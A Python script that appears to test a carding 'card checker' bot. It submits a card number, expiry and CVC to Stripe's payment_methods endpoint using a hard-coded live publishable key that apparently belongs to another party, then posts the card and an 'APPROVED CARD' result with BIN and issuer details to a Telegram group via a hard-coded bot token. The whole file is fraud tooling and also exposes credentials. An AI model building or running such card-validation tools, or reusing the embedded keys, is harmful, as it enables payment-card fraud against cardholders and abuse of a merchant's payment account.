#!/usr/bin/env python3
"""
Simple test to check a card and post to group
"""

import requests
import time

# Bot Configuration
BOT_TOKEN = "7984658748:AAF1QfpAPVg9ncXkA4NKRohqxNfBZ8Pet1s"
GROUP_ID = "-1003538559040"

def send_message(chat_id, text):
    """Send message to Telegram"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': 'HTML'
    }
    try:
        response = requests.post(url, data=data, timeout=10)
        if response.status_code == 200:
            print(f"✅ Message sent!")
            return True
        else:
            print(f"❌ Failed: {response.text}")
            return False
    except Exception as e:
        print(f"❌ Error: {e}")
        return False

def check_test_card():
    """Check a test card and post result"""
    test_card = "5566258985615466|12|25|299"
    
    print(f"Testing card: {test_card}")
    
    # Simulate checking (using actual gate logic)
    n, mm, yy, cvc = test_card.split('|')
    
    # Create Stripe PM
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = f'type=card&billing_details[name]=Test&billing_details[email]=test@gmail.com&billing_details[address][line1]=Street+27&billing_details[address][postal_code]=10080&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51IGkkVAgdYEhlUBFnXi5eN0WC8T5q7yyDOjZfj3wGc93b2MAxq0RvWwOdBdGIl7enL3Lbx27n74TTqElkVqk5fhE00rUuIY5Lp'
    
    try:
        response = requests.post('https://api.stripe.com/v1/payment_methods', 
                                headers=headers, data=data, timeout=20)
        
        if response.status_code == 200:
            pm_json = response.json()
            pm_id = pm_json.get('id')
            
            if pm_id:
                # Send success message to group
                message = f"""
✅✅ <b>TEST APPROVED CARD</b> ✅✅

<b>Card:</b> <code>{test_card}</code>
<b>Gateway:</b> Mady Gate ($1 USD)
<b>Response:</b> Test Approved 🟢

<b>BIN:</b> 556625 | MASTERCARD CREDIT
<b>Bank:</b> Test Bank
<b>Country:</b> United States 🇺🇸

<b>By:</b> Test User
<b>Bot:</b> @MissNullMe
"""
                send_message(GROUP_ID, message)
                print(f"PM Created: {pm_id}")
            else:
                print("Failed to create PM")
                error_msg = pm_json.get('error', {}).get('message', 'Unknown error')
                send_message(GROUP_ID, f"❌ Test Failed: {error_msg}")
        else:
            print(f"HTTP Error: {response.status_code}")
            
    except Exception as e:
        print(f"Error: {e}")
        send_message(GROUP_ID, f"❌ Test Error: {str(e)}")

if __name__ == "__main__":
    print("=" * 50)
    print("Testing Mady Bot Card Check")
    print("=" * 50)
    
    # First send a test message
    print("\n1. Sending test message to group...")
    send_message(GROUP_ID, "🤖 <b>Mady Bot Test</b>\n\nBot is online and ready to check cards!")
    
    time.sleep(2)
    
    # Then check a test card
    print("\n2. Checking test card...")
    check_test_card()
    
    print("\n✅ Test complete! Check your Telegram group.")
    print("=" * 50)
